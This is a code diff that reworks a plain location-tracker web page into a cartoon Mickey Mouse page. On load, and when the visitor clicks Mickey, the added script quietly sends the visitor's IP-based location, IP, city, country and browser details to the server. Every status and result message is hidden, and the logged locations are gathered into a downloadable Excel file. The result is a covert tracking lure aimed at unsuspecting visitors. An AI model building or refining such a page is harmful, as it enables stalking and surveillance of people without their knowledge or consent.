@@ -3,287 +3,375 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Mickey Mouse Location Tracker</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ffd93d 50%, #6bcb77 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+        
         .container {
             background: white;
-            border-radius: 20px;
-            max-width: 650px;
+            border-radius: 30px;
+            max-width: 500px;
             width: 100%;
+            padding: 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-        }
-        header {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
-            color: white;
-            padding: 25px;
             text-align: center;
-        }
-        header h1 { font-size: 1.8rem; }
-        header p { opacity: 0.9; margin-top: 5px; }
-        .main-content { padding: 25px; }
-        
-        .auto-fetch-banner {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .auto-fetch-banner.success { background: #28a745; }
-        .auto-fetch-banner.error { background: #dc3545; }
-        .auto-icon { font-size: 1.3rem; }
-
-        .image-container {
             position: relative;
-            cursor: pointer;
-            border-radius: 12px;
             overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, #ffd93d 10%, transparent 10%);
+            background-size: 30px 30px;
+            opacity: 0.2;
+            border-radius: 50%;
+        }
+        
+        .mickey-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             margin-bottom: 20px;
         }
-        .tracking-image { width: 100%; display: block; }
-        .overlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.3);
+        
+        .mickey-ears {
             display: flex;
             justify-content: center;
+            gap: 80px;
+            margin-bottom: -30px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .ear {
+            width: 60px;
+            height: 60px;
+            background: #1a1a2e;
+            border-radius: 50%;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        
+        .mickey-face {
+            width: 150px;
+            height: 150px;
+            background: #1a1a2e;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
         }
-        .click-text {
-            color: white;
+        
+        .mickey-eyes {
+            display: flex;
+            gap: 30px;
+            margin-top: 10px;
+        }
+        
+        .eye {
+            width: 25px;
+            height: 30px;
+            background: white;
+            border-radius: 50%;
+            position: relative;
+        }
+        
+        .eye::after {
+            content: '';
+            width: 12px;
+            height: 15px;
+            background: #1a1a2e;
+            border-radius: 50%;
+            position: absolute;
+            bottom: 5px;
+            left: 6px;
+        }
+        
+        .mickey-nose {
+            width: 25px;
+            height: 20px;
+            background: #ff6b6b;
+            border-radius: 50%;
+            margin-top: 5px;
+            box-shadow: 0 2px 10px rgba(255, 107, 107, 0.5);
+        }
+        
+        .mickey-mouth {
+            width: 40px;
+            height: 15px;
+            border-bottom: 3px solid white;
+            border-radius: 0 0 50% 50%;
+            margin-top: 5px;
+        }
+        
+        h1 {
+            color: #1a1a2e;
+            margin: 15px 0 5px;
             font-size: 1.8rem;
-            font-weight: bold;
-            text-shadow: 0 2px 15px rgba(0,0,0,0.6);
-            animation: pulse 2s ease-in-out infinite;
+            text-shadow: 2px 2px 0 #ffd93d;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        
+        .subtitle {
+            color: #666;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
         }
-
-        .status-message {
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            text-align: center;
-            background: #f8f9fa;
-            color: #6c757d;
-            border-left: 4px solid #6c757d;
-        }
-        .status-message.success { background: #d4edda; border-color: #28a745; color: #155724; }
-        .status-message.error { background: #f8d7da; border-color: #dc3545; color: #721c24; }
-        .status-message.loading { background: #cce5ff; border-color: #007bff; color: #004085; }
-        .status-message.info { background: #d1ecf1; border-color: #17a2b8; color: #0c5460; }
-
-        .result-card {
-            background: #d4edda;
+        
+        .mickey-image {
+            margin: 15px 0;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            background: linear-gradient(135deg, #ffd93d, #ff6b6b);
             padding: 20px;
-            border-radius: 12px;
-            border: 2px solid #28a745;
-            margin-top: 15px;
+        }
+        
+        .mickey-image:hover {
+            transform: scale(1.02);
+        }
+        
+        .mickey-image img {
+            width: 200px;
+            height: 200px;
+            display: block;
+            margin: 0 auto;
+            border-radius: 50%;
+            background: white;
+            padding: 10px;
+        }
+        
+        .click-hint {
+            color: #1a1a2e;
+            font-weight: bold;
+            margin-top: 10px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        /* HIDDEN STATUS - No messages visible */
+        .status-message {
             display: none;
         }
-        .result-card h2 { color: #155724; text-align: center; margin-bottom: 12px; font-size: 1.2rem; }
-        .location-details {
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
+        
+        .result-card {
+            display: none;
         }
-        .location-details div {
-            padding: 6px 0;
-            border-bottom: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
+        
+        .error-card {
+            display: none;
         }
-        .location-details div:last-child { border-bottom: none; }
-        .location-details .label { font-weight: bold; color: #495057; }
-        .location-details .value { color: #212529; }
-
-        .email-status {
-            margin-top: 10px;
-            padding: 10px;
-            border-radius: 8px;
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            text-align: center;
-            font-size: 0.9rem;
-            color: #856404;
-        }
-        .email-status.sent {
-            background: #d4edda;
-            border-color: #28a745;
-            color: #155724;
-        }
-        .email-status.error {
-            background: #f8d7da;
-            border-color: #dc3545;
-            color: #721c24;
-        }
-
+        
         .btn {
             display: inline-block;
-            padding: 10px 20px;
+            padding: 12px 25px;
             border: none;
-            border-radius: 8px;
+            border-radius: 50px;
             font-size: 0.95rem;
             cursor: pointer;
             text-decoration: none;
             transition: all 0.3s ease;
             font-weight: 600;
-            text-align: center;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            margin: 5px;
         }
-        .btn-map { background: #007bff; color: white; width: 100%; }
-        .btn-map:hover { background: #0056b3; }
-        .btn-refresh {
+        
+        .btn-map {
+            background: #007bff;
+            color: white;
+            width: 100%;
+        }
+        
+        .btn-map:hover {
+            background: #0056b3;
+            transform: scale(1.02);
+        }
+        
+        .btn-excel {
             background: #28a745;
             color: white;
-            padding: 10px 30px;
             width: 100%;
         }
-        .btn-refresh:hover { background: #218838; }
-        .btn-test-email {
-            background: #17a2b8;
-            color: white;
-            padding: 8px 20px;
-            margin-top: 10px;
+        
+        .btn-excel:hover {
+            background: #218838;
+            transform: scale(1.02);
+        }
+        
+        .btn-refresh {
+            background: #ffd93d;
+            color: #1a1a2e;
             width: 100%;
         }
-        .btn-test-email:hover { background: #138496; }
-
-        .error-card {
-            background: #f8d7da;
-            padding: 20px;
-            border-radius: 12px;
-            border: 2px solid #dc3545;
-            text-align: center;
+        
+        .btn-refresh:hover {
+            background: #f9c900;
+            transform: scale(1.02);
+        }
+        
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
             margin-top: 15px;
-            display: none;
         }
-        .error-card h2 { color: #721c24; font-size: 1.2rem; }
-        .error-card p { color: #721c24; margin: 10px 0; }
-        .btn-retry { background: #007bff; color: white; }
-        .btn-retry:hover { background: #0056b3; }
-
-        footer { text-align: center; padding: 15px; background: #f8f9fa; color: #6c757d; font-size: 0.85rem; border-top: 1px solid #dee2e6; }
-
+        
+        .excel-count {
+            background: #e7f3ff;
+            padding: 8px 15px;
+            border-radius: 20px;
+            display: inline-block;
+            font-size: 0.85rem;
+            color: #004085;
+            margin-top: 15px;
+        }
+        
+        footer {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 2px dashed #dee2e6;
+            color: #6c757d;
+            font-size: 0.8rem;
+        }
+        
+        /* Loading spinner - subtle */
+        .loading-spinner {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-spinner.active {
+            display: block;
+        }
+        
         @media (max-width: 600px) {
-            header h1 { font-size: 1.4rem; }
-            .main-content { padding: 15px; }
-            .click-text { font-size: 1.3rem; }
-            .location-details div { flex-direction: column; gap: 2px; }
+            .container { padding: 20px; }
+            .mickey-face { width: 120px; height: 120px; }
+            .mickey-eyes { gap: 20px; }
+            .eye { width: 20px; height: 25px; }
+            .ear { width: 45px; height: 45px; }
+            .mickey-ears { gap: 60px; }
+            h1 { font-size: 1.4rem; }
+            .mickey-image img { width: 150px; height: 150px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <header>
-            <h1>📍 Location Tracker</h1>
-            <p>Auto-fetching location in <span id="timerDisplay">5</span> seconds...</p>
-        </header>
-
-        <div class="main-content">
-            <div class="auto-fetch-banner" id="autoFetchBanner">
-                <span class="auto-icon">🔄</span>
-                <span id="bannerText">Getting location...</span>
+        <!-- Mickey Mouse Header -->
+        <div class="mickey-header">
+            <div class="mickey-ears">
+                <div class="ear"></div>
+                <div class="ear"></div>
             </div>
-
-            <div class="image-container" onclick="manualFetchLocation()">
-                <img id="trackingImage"
-                    src="https://via.placeholder.com/600x350/667eea/ffffff?text=Click+for+Location"
-                    alt="Location tracker"
-                    class="tracking-image"
-                />
-                <div class="overlay" id="overlay">
-                    <span class="click-text">👆 Click Here</span>
+            <div class="mickey-face">
+                <div class="mickey-eyes">
+                    <div class="eye"></div>
+                    <div class="eye"></div>
                 </div>
-            </div>
-
-            <div id="status" class="status-message">📍 Getting your location...</div>
-
-            <div id="result" class="result-card">
-                <h2>✅ Location Captured!</h2>
-                <div id="locationDetails" class="location-details"></div>
-                <div style="margin-top: 12px;">
-                    <a id="resultMapLink" href="#" target="_blank" class="btn btn-map">🗺️ View on Google Maps</a>
-                </div>
-                <div id="emailStatus" class="email-status">📧 Sending email via SendGrid...</div>
-            </div>
-
-            <div id="errorMessage" class="error-card">
-                <h2>❌ Oops!</h2>
-                <p id="errorText">Something went wrong.</p>
-                <button onclick="manualFetchLocation()" class="btn btn-retry">🔄 Try Again</button>
-            </div>
-
-            <div style="margin-top: 15px;">
-                <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Refresh Location</button>
-                <button onclick="testEmail()" class="btn btn-test-email">📧 Test Email</button>
+                <div class="mickey-nose"></div>
+                <div class="mickey-mouth"></div>
             </div>
         </div>
-
+        
+        <h1>🐭 Mickey's Tracker</h1>
+        <p class="subtitle">Click Mickey to capture your location</p>
+        
+        <!-- Mickey Mouse Image -->
+        <div class="mickey-image" onclick="manualFetchLocation()">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='90' fill='%23f5f5f5'/%3E%3Ccircle cx='50' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='150' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='100' cy='110' r='70' fill='%231a1a2e'/%3E%3Ccircle cx='70' cy='95' r='15' fill='white'/%3E%3Ccircle cx='130' cy='95' r='15' fill='white'/%3E%3Ccircle cx='75' cy='100' r='7' fill='%231a1a2e'/%3E%3Ccircle cx='125' cy='100' r='7' fill='%231a1a2e'/%3E%3Cellipse cx='100' cy='120' rx='12' ry='8' fill='%23ff6b6b'/%3E%3Cpath d='M85 130 Q100 140 115 130' stroke='white' stroke-width='3' fill='none'/%3E%3C/svg%3E" 
+                 alt="Mickey Mouse" 
+                 id="mickeyImage"
+                 title="Click me to get your location!" />
+            <div class="click-hint">👆 Click Mickey</div>
+        </div>
+        
+        <!-- Hidden status - no messages shown -->
+        <div id="status" class="status-message"></div>
+        
+        <!-- Loading spinner (subtle) -->
+        <div class="loading-spinner" id="loadingSpinner"></div>
+        
+        <!-- Hidden result -->
+        <div id="result" class="result-card">
+            <h2>✅ Location Captured!</h2>
+            <div id="locationDetails" class="location-details"></div>
+            <a id="resultMapLink" href="#" target="_blank" class="btn btn-map">🗺️ View on Google Maps</a>
+        </div>
+        
+        <!-- Hidden error -->
+        <div id="errorMessage" class="error-card">
+            <h2>😢 Oops!</h2>
+            <p id="errorText">Something went wrong.</p>
+            <button onclick="manualFetchLocation()" class="btn btn-retry">🔄 Try Again</button>
+        </div>
+        
+        <div class="button-group">
+            <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Refresh</button>
+            <a href="/download-excel" target="_blank" class="btn btn-excel">📊 Download Excel</a>
+        </div>
+        
+        <div class="excel-count" id="locationCount">📊 Total: 0 locations</div>
+        
         <footer>
-            <p>📍 Location captured in &lt;5 seconds • Email via SendGrid</p>
+            <p>🐭 All locations saved to Excel silently</p>
         </footer>
     </div>
-
+    
     <script>
-        // ===== FAST SCRIPT =====
+        // ===== SILENT SCRIPT - NO MESSAGES =====
         let autoFetched = false;
-        let countdownInterval = null;
-        let secondsLeft = 5;
-
-        // Timer display
-        function startCountdown() {
-            const timerDisplay = document.getElementById('timerDisplay');
-            secondsLeft = 5;
-            timerDisplay.textContent = secondsLeft;
-            
-            countdownInterval = setInterval(() => {
-                secondsLeft--;
-                timerDisplay.textContent = secondsLeft;
-                if (secondsLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    timerDisplay.textContent = 'now';
-                }
-            }, 1000);
-        }
-
-        // Test email
-        async function testEmail() {
-            updateStatus('info', '📧 Sending test email via SendGrid...');
+        
+        // Update location count only
+        async function updateLocationCount() {
             try {
-                const response = await fetch('/test-email');
+                const response = await fetch('/api/locations');
                 const result = await response.json();
-                if (result.success) {
-                    updateStatus('success', '✅ Test email sent! Check your inbox.');
-                    alert('✅ Test email sent! Check your inbox at ' + new Date().toLocaleTimeString());
-                } else {
-                    updateStatus('error', '❌ Test email failed: ' + result.error);
-                    alert('❌ Test email failed. Check server logs.');
+                if (result.success && result.data) {
+                    document.getElementById('locationCount').textContent = 
+                        `📊 Total: ${result.data.length} locations`;
                 }
-            } catch (error) {
-                updateStatus('error', '❌ Test email error: ' + error.message);
-            }
+            } catch (error) {}
         }
-
+        
         // GET LOCATION FAST
         async function getLocationFast() {
             try {
@@ -295,37 +383,28 @@
                         googleMapsLink: `https://www.google.com/maps?q=${result.data.latitude},${result.data.longitude}`
                     };
                 }
-            } catch (error) {
-                console.log('IP location failed:', error);
-            }
+            } catch (error) {}
             
             return {
                 latitude: 40.7128,
                 longitude: -74.0060,
                 city: 'Unknown',
                 country: 'Unknown',
+                ip: 'Unknown',
                 accuracy: 'Fallback',
                 source: 'Fallback',
                 googleMapsLink: 'https://www.google.com/maps?q=40.7128,-74.0060'
             };
         }
-
-        // AUTO-FETCH
+        
+        // AUTO-FETCH ON LOAD (SILENT)
         async function autoFetchLocation() {
             if (autoFetched) return;
             
-            updateStatus('loading', '📍 Getting your location...');
-            updateBanner('🔄', 'Getting location...', '');
-
             try {
                 const location = await getLocationFast();
                 if (!location) throw new Error('No location');
-
-                // Show email sending status
-                const emailStatus = document.getElementById('emailStatus');
-                emailStatus.className = 'email-status';
-                emailStatus.textContent = '📧 Sending email via SendGrid...';
-
+                
                 const response = await fetch('/api/track-location', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -334,87 +413,74 @@
                         longitude: location.longitude,
                         accuracy: location.accuracy || 0,
                         source: location.source || 'IP',
+                        ip: location.ip || 'N/A',
+                        city: location.city || 'N/A',
+                        country: location.country || 'N/A',
                         userAgent: navigator.userAgent,
                         autoFetched: true
                     })
                 });
-
+                
                 const result = await response.json();
                 
                 if (result.success) {
-                    updateStatus('success', `✅ Location found! (${location.source})`);
-                    updateBanner('✅', 'Location captured!', 'success');
-                    showResult(location);
-                    
-                    // Update email status
-                    if (result.emailSent) {
-                        emailStatus.className = 'email-status sent';
-                        emailStatus.textContent = '✅ Email sent successfully via SendGrid! Check your inbox.';
-                    } else {
-                        emailStatus.className = 'email-status error';
-                        emailStatus.textContent = '❌ Email not sent - SendGrid not configured';
-                    }
-                    
-                    document.getElementById('trackingImage').src = 
-                        'https://via.placeholder.com/600x350/28a745/ffffff?text=✅+Location+Found!';
-                    document.getElementById('overlay').style.display = 'none';
+                    updateLocationCount();
                     autoFetched = true;
                 }
             } catch (error) {
                 console.error('Auto-fetch error:', error);
-                updateStatus('error', '❌ Failed. Click to retry.');
-                updateBanner('❌', 'Click to retry', 'error');
-                document.getElementById('emailStatus').textContent = '❌ Error: ' + error.message;
-                document.getElementById('emailStatus').className = 'email-status error';
             }
         }
-
-        function updateStatus(type, message) {
-            const el = document.getElementById('status');
-            el.className = `status-message ${type}`;
-            el.textContent = message;
-        }
-
-        function updateBanner(icon, text, type) {
-            document.querySelector('.auto-icon').textContent = icon;
-            document.getElementById('bannerText').textContent = text;
-            const banner = document.getElementById('autoFetchBanner');
-            banner.className = 'auto-fetch-banner' + (type ? ' ' + type : '');
-        }
-
-        function showResult(location) {
-            const resultDiv = document.getElementById('result');
-            const detailsDiv = document.getElementById('locationDetails');
-            const mapLink = document.getElementById('resultMapLink');
-
-            detailsDiv.innerHTML = `
-                <div><span class="label">📡 Source:</span> <span class="value">${location.source || 'IP'}</span></div>
-                <div><span class="label">📍 Latitude:</span> <span class="value">${location.latitude}</span></div>
-                <div><span class="label">📍 Longitude:</span> <span class="value">${location.longitude}</span></div>
-                ${location.city && location.city !== 'Unknown' ? `<div><span class="label">🏙️ City:</span> <span class="value">${location.city}</span></div>` : ''}
-                ${location.country && location.country !== 'Unknown' ? `<div><span class="label">🌍 Country:</span> <span class="value">${location.country}</span></div>` : ''}
-                <div><span class="label">🎯 Accuracy:</span> <span class="value">${location.accuracy || 'N/A'}</span></div>
-            `;
-
-            mapLink.href = location.googleMapsLink;
-            resultDiv.style.display = 'block';
-        }
-
-        function manualFetchLocation() {
+        
+        // MANUAL FETCH (SILENT)
+        async function manualFetchLocation() {
             autoFetched = false;
-            document.getElementById('result').style.display = 'none';
-            document.getElementById('errorMessage').style.display = 'none';
-            autoFetchLocation();
+            
+            // Show subtle loading
+            document.getElementById('loadingSpinner').classList.add('active');
+            
+            try {
+                const location = await getLocationFast();
+                if (!location) throw new Error('No location');
+                
+                const response = await fetch('/api/track-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude: location.latitude,
+                        longitude: location.longitude,
+                        accuracy: location.accuracy || 0,
+                        source: location.source || 'IP',
+                        ip: location.ip || 'N/A',
+                        city: location.city || 'N/A',
+                        country: location.country || 'N/A',
+                        userAgent: navigator.userAgent,
+                        autoFetched: false
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    updateLocationCount();
+                    autoFetched = true;
+                }
+            } catch (error) {
+                console.error('Manual fetch error:', error);
+            } finally {
+                document.getElementById('loadingSpinner').classList.remove('active');
+            }
         }
-
+        
         // ===== PAGE LOAD =====
         window.addEventListener('load', () => {
-            console.log('📍 Location Tracker loaded!');
-            startCountdown();
+            console.log('🐭 Silent Location Tracker loaded');
+            updateLocationCount();
             
+            // Auto-fetch after 1 second (silent)
             setTimeout(() => {
                 autoFetchLocation();
-            }, 100);
+            }, 1000);
         });
     </script>
 </body>
